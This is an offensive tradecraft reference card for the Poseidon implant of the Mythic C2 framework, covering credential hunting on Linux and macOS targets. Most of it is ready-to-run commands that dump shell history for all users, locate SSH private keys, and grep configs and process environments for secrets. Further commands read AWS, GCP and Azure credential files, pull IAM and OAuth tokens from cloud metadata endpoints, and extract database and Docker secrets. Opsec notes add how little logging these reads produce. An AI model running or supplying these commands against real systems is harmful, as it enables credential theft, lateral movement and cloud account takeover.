---
name: Linux Credential Hunting
category: credential-access
subcategories: [linux-creds, ssh-keys, config-files, bash-history, environment-vars]
tradecraft_tags: [linux, credentials, ssh-keys, bash-history, config-files, poseidon, technique]
mitre_attack:
  - id: T1552.001
    name: Unsecured Credentials — Credentials In Files
  - id: T1552.003
    name: Unsecured Credentials — Bash History
  - id: T1552.004
    name: Unsecured Credentials — Private Keys
source:
  url: https://attack.mitre.org/techniques/T1552/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [linux, macos]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  File reads are detectable by auditd with appropriate watch rules. Bash history reads
  are filesystem reads. SSH key discovery requires file enumeration. Without comprehensive
  auditd rules targeting specific files, most of these operations are not logged by default.
usage_examples:
  - description: Read bash history for all accessible users
    args: "cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null"
  - description: Find private SSH keys
    args: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null | head -50"
  - description: Find credential files by content keywords
    args: "grep -r 'password\\|passwd\\|secret\\|token\\|apikey\\|api_key' /home/ /etc/ /var/www/ 2>/dev/null | head -100"
  - description: Check environment variables for credentials
    args: "env | grep -i 'pass\\|secret\\|token\\|key\\|api'"
  - description: Find database configuration files
    args: "find / -name '*.conf' -o -name '*.config' -o -name 'settings.py' -o -name '.env' 2>/dev/null | head -30"
  - description: Check web application configs
    args: "find /var/www/ /srv/ /opt/ -name 'config.php' -o -name 'database.yml' -o -name '.env' 2>/dev/null"
opsec_notes: |
  Linux credential hunting is primarily passive filesystem reads. Without auditd
  watchers on specific paths, these operations generate minimal telemetry. The most
  valuable targets are usually: bash history files (often contain cleartext admin
  commands with credentials), SSH private keys (enable lateral movement to other hosts
  without cracking passwords), and web application config files (database credentials,
  API keys).
gotchas: |
  This is a TECHNIQUE REFERENCE for Poseidon shell commands on Linux/macOS targets.
  Always check .bash_history in root's home (/root/.bash_history) if you have access.
  Docker containers often have credentials in environment variables (docker inspect
  shows these). Cloud VMs: check IMDS for cloud credentials (see sharpcloud.md for
  Windows equivalent; curl http://169.254.169.254 for Linux).
related_ttps: [linux-privesc, linpeas, poseidon, credential-hunting-checklist]
alternatives: [linpeas-creds-section, manual-grep]
common_args: {}
last_updated: 2026-05-29
---

# Linux Credential Hunting

A reference for credential discovery on Linux and macOS targets via Poseidon's shell
commands. Linux environments often store credentials in plaintext in files, environment
variables, and command history.

## Priority Checks

### 1. Bash/Shell History (VERY HIGH VALUE)

```bash
# Current user:
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.fish_history

# All users (if readable):
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null  # requires root
```
History often contains: SSH commands with passwords (`ssh user@host -p password`),
curl/wget with API keys, database credentials, sudo commands.

### 2. SSH Private Keys

```bash
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find ~/.ssh/ 2>/dev/null
# Check authorized_keys to know which hosts trust these keys:
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts    # hosts this user has connected to
```

### 3. Environment Variables

```bash
env
printenv
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|token\|key\|api"
# Docker: container processes often have cloud creds as environment vars
```

### 4. Configuration Files

```bash
# Web applications:
find /var/www/ /srv/ /opt/ /home/ -name "*.env" -o -name "config.php" \
  -o -name "database.yml" -o -name "settings.py" -o -name "wp-config.php" 2>/dev/null

# Database configs:
find / -name "my.cnf" -o -name "postgres*" -o -name "mongodb.conf" 2>/dev/null

# App configs with credentials:
grep -r "password\|passwd\|db_pass\|secret\|apikey" /etc/ /var/www/ /opt/ 2>/dev/null
```

### 5. Cloud Credentials

```bash
# AWS:
cat ~/.aws/credentials
cat ~/.aws/config
env | grep AWS

# GCP:
cat ~/.config/gcloud/application_default_credentials.json
ls ~/.config/gcloud/

# Azure:
cat ~/.azure/accessTokens.json
ls ~/.azure/

# Instance Metadata (cloud VM):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null  # AWS
curl -s -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>/dev/null  # Azure
```

### 6. Database Credentials

```bash
cat /etc/mysql/debian.cnf   # MySQL maintenance creds
cat /var/lib/mysql/.mysql_secret   # MySQL root password
cat /etc/postgresql/*/pg_hba.conf   # PostgreSQL auth config
psql -U postgres -l 2>/dev/null   # List databases if pg accessible
```

### 7. Application-Specific

```bash
# Git repositories may contain secrets:
find / -name ".git" -type d 2>/dev/null | head -20
git log --all --full-history 2>/dev/null | grep -i "password\|secret\|token" | head -20

# Docker:
docker inspect $(docker ps -q) 2>/dev/null | grep -i "Env\|password\|secret"
cat /var/lib/docker/volumes/*/_data/*.conf 2>/dev/null
```

## Via Poseidon

Execute all of these via Poseidon's shell command. Output is returned to Mythic for review.
